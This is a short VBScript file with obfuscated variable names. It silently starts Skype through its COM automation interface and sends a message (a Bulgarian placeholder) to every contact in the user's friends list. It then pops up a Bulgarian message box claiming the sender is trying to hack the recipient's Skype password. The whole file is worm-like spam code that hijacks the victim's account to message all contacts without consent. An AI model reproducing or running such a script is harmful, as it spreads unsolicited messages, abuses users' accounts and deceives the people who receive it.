on error resume next
set NrrlP = WScript.CreateObject("Scripting.FileSystemObject")
set uDlVA = wscript.createobject("wscript.shell")
set yADAl = WScript.CreateObject("Skype4COM.Skype", "Skype_")
yADAl.Client.Start()
yADAl.Attach()
For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.handle,"<съобщение до всички>"
next
msgbox "Здравейте, абонатът от който получихте това съобщение, се опитва да хакне паролата ви за Skype"